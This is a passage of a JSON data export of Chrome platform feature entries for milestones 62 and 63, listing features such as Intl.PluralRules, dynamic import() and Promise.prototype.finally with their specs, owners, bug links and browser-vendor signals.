      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#htmlcollection",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1270349",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "raphael.kubo.da.costa@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=703990",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/210667/webkit",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Blink now follows the DOM and HTML specs and declares HTMLAllCollection, HTMLCollection, HTMLFormControlsCollection and HTMLOptionsCollection with the [LegacyUnenumerableNamedProperties] extended attribute. Its named properties are no longer marked as enumerable, being left out of calls to e.g. Object.keys() and for-in loops.",
    "id": 4759960915279872,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-10-20 17:26:49.189430",
      "by": "jmedley@google.com"
    },
    "name": "Interface properties with a Promise type no longer throw exceptions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://heycam.github.io/webidl/#dfn-attribute-getter",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "raphael.kubo.da.costa@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>Bindings"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=758023",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Interface properties that return a Promise now reject (meaning they'll invoke a catch block) instead of throwing an exception. This has already been done for functions.",
    "id": 5654995223445504,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-09 16:33:02.981310",
      "by": "mathiasb@google.com"
    },
    "name": "Intl.PluralRules",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://rawgit.com/caridy/intl-plural-rules-spec/master/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1270146",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>JavaScript>Internationalization"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5601",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Intl.PluralRules is a new API which exposes language-dependent data on pluralization forms of numbers. Given a locale and a number, Intl.PluralRules outputs a category, which can then be used for selection of the pluralization form of surrounding text.",
    "id": 5653874773852160,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/10/intl-pluralrules",
        "https://github.com/tc39/proposal-intl-plural-rules/blob/master/PROPOSAL.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-10 00:42:39.938580",
      "by": "gsathya@chromium.org"
    },
    "name": "JavaScript module import()",
    "tags": [
      "dynamic",
      "import",
      "imports",
      "import()",
      "modules",
      "loader"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/proposal-dynamic-import/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/tc39/tc39-notes/blob/master/es7/2016-11/dec-1.md#14ii-import-open-issues-and-stage-3-discussion",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "gsathya@chromium.org",
          "kouhei@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "ios": 63,
        "blink_components": [
          "Blink>JavaScript"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5785",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "url": "https://github.com/tc39/tc39-notes/blob/master/es7/2016-11/dec-1.md#14ii-import-open-issues-and-stage-3-discussion",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7423/release-notes-for-safari-technology-preview-24/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This JavaScript feature adds a \"function-like\" import() module loading syntactic form to JavaScript. \r\n\r\nThe existing syntactic forms for importing modules are static declarations. However, it's also desirable to be able to dynamically load parts of a JavaScript application at runtime.",
    "id": 5684934484164608,
    "resources": {
      "docs": [
        "https://github.com/tc39/proposal-dynamic-import"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-17 20:30:08.177610",
      "by": "kochi@google.com"
    },
    "name": "Make /deep/ behave like the descendant combinator \" \" in CSS live profile (in css file or inside of <style>)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css-scoping/#deep-combinator",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=489954",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Make /deep/ behave like the descendant combinator \" \" in CSS live profile; effectively no-op.\r\n\r\nSee \"Intent to Remove\" thread for more details: https://groups.google.com/a/chromium.org/d/topic/blink-dev/HX5Y8Ykr5Ns/discussion\r\n\r\nhttps://www.w3.org/TR/selectors-4/#profiles\r\nCSS live profile = CSS selector used in CSS file or inside of <style>. \r\nCSS snapshot profile = CSS selector used in JS, such as querySelector(..)",
    "id": 4964279606312960,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-02-08 17:13:20.328260",
      "by": "jmedley@google.com"
    },
    "name": "MediaStreamTrack.applyConstraints",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>GetUserMedia"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "http://crbug.com/338503",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "applyConstraints() allows changing the constraints associated with a MediaStreamTrack.\r\nThis is useful to change settings such as video resolution or frame rate.\r\n\r\n\r\napplyConstraints() was previously released with support for ImageCapture (https://w3c.github.io/mediacapture-image/).\r\nThis feature includes adding support for the main spec (https://w3c.github.io/mediacapture-main/).",
    "id": 5131064242601984,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Media_Streams_API/Constraints",
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack/applyConstraints"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-05-28 06:33:46.909620",
      "by": "kenjibaheux@google.com"
    },
    "name": "No State Prefetch",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "pasko@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "ios": 63,
        "blink_components": [
          "Internals>Network"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=632361",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A mechanism for speculative prefetching of webpages and their subresources that are on a critical path of page loading *without* executing any JavaScript or creating a complex state of the web platform. This system is not purely “no state” because HTTP cache allows to create cookies and other state related to validating cache entries.\r\n\r\nIt is important to note that the “NoState Prefetch” is not an API. \r\nServer side detection: https://bugs.chromium.org/p/chromium/issues/detail?id=796855",
    "id": 5928321099497472,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/16VCYGGWau483IMSxODpg5faZny1FJ6vNK2v-BuM5EhU/edit"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-23 17:49:02.721970",
      "by": "mathiasb@google.com"
    },
    "name": "Promise.prototype.finally",
    "tags": [
      "javascript",
      "promise"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/proposal-promise-finally/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1019116",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "gsathya@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5967",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3520",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7862/release-notes-for-safari-technology-preview-37/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This finally method is used for registering a callback to be invoked when a promise is settled (either fulfilled, or rejected).",
    "id": 5704570235781120,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/10/promise-finally"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-10 02:34:41.571360",
      "by": "kochi@google.com"
    },
    "name": "Shadow-Piercing descendant combinator, '/deep/' (aka '>>>') for dynamic profile (in stylesheets)",
    "comments": "Shadow-Piercing descendant combinator, '/deep/' (aka '>>>'), including '::shadow' pseudo elements, are deprecated per the resolution at the Web Components f2f meeting [1]. See also \"Intent to deprecate\" [2].\r\n\r\n[1]: https://www.w3.org/wiki/Webapps/WebComponentsApril2015Meeting\r\n[2]: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/68qSZM5QMRQ/pT2YCqZSomAJ\r\n\r\nIntent to remove: https://groups.google.com/a/chromium.org/d/topic/blink-dev/HX5Y8Ykr5Ns/discussion",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css-scoping/#deep-combinator",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 63
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=489954",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When a /deep/ combinator (or shadow-piercing descendant combinator '>>>') is encountered in a selector, replace every element in the selector match list with every element reachable from the original element by traversing any number of child lists or shadow trees.\r\n\r\nNote:\r\n/deep/ was for Shadow DOM V0, >>> was for Shadow DOM V1\r\n\r\nSee also https://www.chromestatus.com/feature/4964279606312960\r\nhttps://www.chromestatus.com/feature/5045542597951488",
    "id": 6750456638341120,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:43:15.164410",
      "by": "jsbell@chromium.org"
    },
    "name": "Web Storage: Anonymous getter may return null",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/webstorage.html#the-storage-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "raphael.kubo.da.costa@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>Storage>DOMStorage"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=651774",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/195760/webkit",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Blink used to add an anonymous named property getter to the Storage interface (used by sessionStorage and localStorage) that behaved slightly differently from the getItem() method. The anonymous getter has been removed, and getItem() is now used behind the scenes instead. One visible consequence is that attempting to access a key that does not exist via the getter will return null instead of undefined.",
    "id": 5700418495578112,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:43:04.125280",
      "by": "jsbell@chromium.org"
    },
    "name": "Web Storage: Methods are now enumerable",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/webstorage.html#the-storage-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "raphael.kubo.da.costa@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>Storage>DOMStorage"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=651774",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/195760/webkit",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The methods belonging to the Storage IDL interface (available via sessionStorage and localStorage), such as getItem(), clear() and removeItem() are now enumerable as mandated by the HTML spec.\r\n\r\nThey are not returned by Object.keys(), but do appear in e.g. for-in loops.",
    "id": 5120599789666304,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-09-27 23:08:08.808110",
      "by": "tkent@chromium.org"
    },
    "name": "beforeprint and afterprint events",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#printing-steps",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "http://crbug.com/218205",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "'beforeprint' event is dispatched before starting printing, and 'afterprint' event is dispatched after finishing printing. They are useful to build printing-only content, and clean it up.\r\n",
    "id": 5700595042222080,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-10-10 14:28:58.372600",
      "by": "owencm@google.com"
    },
    "name": "display:minimal-ui ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/manifest/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "owencm@chromium.org",
          "piotrs@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Browser>Mobile(Android)"
        ],
        "flag": false,
        "android": 63,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support the minimal-ui display mode as defined in the Web App Manifest.\r\n\r\nThis property will result in Chrome displaying a \"Chrome Custom Tab\"-like UI.\r\n\r\n",
    "id": 5680906727587840,
    "resources": {
      "samples": [
        "You can test this by adding to home screen the site at: https://piotrswigon.github.io/pwa-demo/minimal-demo/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-04 09:58:30.957390",
      "by": "myakura.web@gmail.com"
    },
    "name": "macOS: rounded borders for buttons in User-Agent stylesheet",
    "comments": "reverted for breaking backwards compatibility\r\nhttps://chromium.googlesource.com/chromium/src.git/+/f764659b2235005f9e1f6c5a86fd27716a6bad38",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 63
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Forms"
        ],
        "desktop": 63,
        "flag": false,
        "bug": "http://crbug.com/546679",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Only for macOS.\r\n\r\nThe default stylesheet for <button>, <input type=button>, <input type=reset>, <input type=submit>, a button in <input type=file> was changed in order to match OS-native buttons. \r\n\r\nBackground-color, border, border-radius, and padding were changed.\r\n",
    "id": 5743649186906112,
    "resources": {
      "docs": [
        "https://bugs.chromium.org/p/chromium/issues/detail?id=546679#c13"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-19 01:04:35.340880",
      "by": "ericbidelman@google.com"
    },
    "name": "navigator.webdriver",
    "tags": [
      "headless"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/webdriver/#interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "shekyan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Headless"
        ],
        "desktop": 63,
        "flag": false,
        "bug": "https://crbug.com/723900",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Webdriver specification defines a `navigator.webdriver` property to indicate if UA is controlled by automation. This property is defined and returns `true` when running Chrome with the `--headless` flag.",
    "id": 6216034532982784,
    "resources": {
      "docs": [
        "Intent thread: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/6GysDZCWwB8/rXbGoRohBgAJ"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-07-24 22:54:58.355990",
      "by": "tkent@chromium.org"
    },
    "first_of_milestone": true,
    "name": "<data> element",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-data-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/737419",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "<data> element",
    "id": 5701891585474560,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-25 18:39:48.775710",
      "by": "jmedley@google.com"
    },
    "name": "<time> element",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-time-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "http://crbug.com/655921",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "<time> element",
    "id": 5633937149788160,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/time"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-09-12 13:07:19.905220",
      "by": "fbeaufort@google.com"
    },
    "name": "API for customizing HTMLMediaElement.seekable for Media Source live streams",
    "tags": [
      "MSE",
      "MediaSource",
      "seekable",
      "live",
      "setLiveSeekableRange",
      "clearLiveSeekableRange",
      "liveseekablerange"
    ],
    "comments": "The spec change was kept simple to not break existing HTMLMediaElement behavior for seekable. New behavior occurs only if the new {set,clear}LiveSeekableRanges API is used on the MediaSource attached to that HTMLMediaElement and the media duration is positive infinity.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/media-source/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://w3c.github.io/test-results/media-source/all.html#test-file-38",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 62
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 62,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 62,
        "flag": false,
        "android": 62,
        "bug": "https://crbug.com/623698",
        "intervention": false
      },
      "opera": {
        "android": 49,
        "desktop": 49
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/media-source/pull/92#issuecomment-224961660",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This API lets MediaSource apps more effectively customize the HTMLMediaElement.seekable range logic by providing (or removing) a single seekable range that is union'ed with the current buffered ranges to result in a single seekable range which fits both, when media duration is infinite.",
    "id": 5671401352593408,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/media-source/#dom-mediasource-setliveseekablerange",
        "https://www.w3.org/TR/media-source/#dom-mediasource-clearliveseekablerange",
        "https://www.w3.org/TR/media-source/#htmlmediaelement-extensions"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/media/live-seekable-range.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-07-17 23:50:51.006640",
      "by": "noel@chromium.org"
    },
    "name": "Accept 8 (#RRGGBBAA) and 4 (#RGBA) value hex colors",
    "tags": [
      "#RRGGBBAA"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-color/#hex-notation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
